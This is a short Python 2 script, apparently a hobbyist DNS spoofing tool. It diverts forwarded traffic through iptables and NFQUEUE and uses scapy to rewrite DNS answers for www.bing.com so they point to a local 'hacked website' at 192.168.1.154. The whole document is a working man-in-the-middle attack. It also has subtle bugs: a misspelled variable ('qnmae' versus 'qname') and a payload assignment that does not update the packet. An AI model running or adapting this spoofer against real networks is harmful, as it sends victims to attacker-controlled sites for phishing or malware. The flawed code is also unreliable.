#Python 2
#sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
#sudo iptables --flush

import netfilterqueue
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def procces_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qnmae = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing www.bing.com with hacked website")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.154")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.payload = scapy_packet.payload
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, procces_packet)
queue.run()